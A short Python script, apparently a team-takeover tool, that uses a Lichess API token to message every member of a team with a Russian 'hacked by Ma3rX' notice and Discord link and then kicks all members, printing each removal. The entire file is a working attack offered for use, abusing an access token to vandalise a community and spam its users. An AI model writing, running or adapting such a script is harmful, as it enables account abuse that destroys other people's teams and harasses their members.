import berserk
import requests
import ndjson
from config import *

def hack(token, team):
    msg = """
    Взломано программой Ma3rX. Вопросы задавайте тут:
    https://discord.gg/MkYhNErEGN
    """
    heads = {'Authorization': f'Bearer {token}'}

    session = berserk.TokenSession(token)
    client = berserk.Client(session=session)

    r = requests.get('https://lichess.org/api/team/'+team+'/users')
    data = r.json(cls=ndjson.Decoder)

    requests.post('https://lichess.org/team/'+team+'/pm-all', data={'message': msg}, headers=heads).json()

    for i in data:
        user = i['id']
        client.teams.kick_member(team, user)
        print(green + f"[+] {user} кикнут!")
